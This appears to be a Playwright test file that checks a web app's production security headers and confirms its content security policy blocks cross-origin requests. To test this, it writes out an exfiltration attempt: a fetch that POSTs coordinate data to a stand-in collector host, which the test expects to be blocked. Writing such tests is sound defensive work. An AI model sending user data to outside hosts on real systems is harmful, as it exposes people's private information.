import { expect, test } from '@playwright/test';
import {
  cspViolations,
  installBrowserMocks,
  stubTilesAndRecordHosts,
} from './support/browserMocks';

// `vite preview` serves the same headers as Cloudflare Pages' generated `_headers` (deploy/).
test.describe('production security headers (NFR-02, NFR-06)', () => {
  test('every route, including SPA deep links, carries the security headers', async ({
    request,
  }) => {
    for (const path of ['/', '/history', '/trips/does-not-exist']) {
      const response = await request.get(path);
      expect(response.status()).toBe(200);
      const headers = response.headers();
      expect(headers['content-security-policy']).toContain("connect-src 'self'");
      expect(headers['content-security-policy']).toContain("frame-ancestors 'none'");
      expect(headers['permissions-policy']).toContain('geolocation=(self)');
      expect(headers['referrer-policy']).toBe('strict-origin-when-cross-origin');
      expect(headers['x-content-type-options']).toBe('nosniff');
    }
  });

  test('page code cannot send data to another origin', async ({ page }) => {
    await installBrowserMocks(page, { permission: 'granted' });
    await stubTilesAndRecordHosts(page);
    // If the policy failed, this stub would answer and the fetch would succeed.
    await page.route('https://collector.example.com/**', (route) =>
      route.fulfill({ status: 200, body: 'ok' }),
    );
    await page.goto('/');
    const result = await page.evaluate(() =>
      fetch('https://collector.example.com/upload', { method: 'POST', body: '21.0,105.8' }).then(
        () => 'sent',
        () => 'blocked',
      ),
    );
    expect(result).toBe('blocked');
    expect(await cspViolations(page)).toEqual(['connect-src https://collector.example.com/upload']);
  });
});
